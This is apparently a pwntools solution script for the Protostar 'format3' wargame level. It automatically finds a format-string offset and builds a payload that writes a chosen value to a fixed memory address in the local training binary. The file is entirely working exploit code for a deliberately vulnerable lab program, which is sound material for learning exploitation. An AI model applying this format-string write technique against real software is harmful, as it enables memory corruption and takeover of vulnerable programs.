#!python3
from pwn import *
# Assume a process that reads a string
# and gives this string as the first argument
# of a printf() call
# It do this indefinitely


# Function called in order to send a payload
def send_payload(payload):
    p = process('../../protostar/format3')
    p.sendline(payload)
    log.info("payload = %s" % repr(payload))
    a = p.recvall()
    log.info("output = %s" % repr(a))
    p.close()
    return a

# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=send_payload)
offset = format_string.offset
log.info("offset = %d" % offset)
write = {
    0x80496f4: 0x01025544
}
#33 = size của payload tìm ra offset
payload = fmtstr_payload(offset, write)
payload = payload + b'a' * (33 - len(payload))
log.info("payload = %s" % repr(payload))
p = process('../../protostar/format3')
p.sendline(payload)

print(p.recvall())
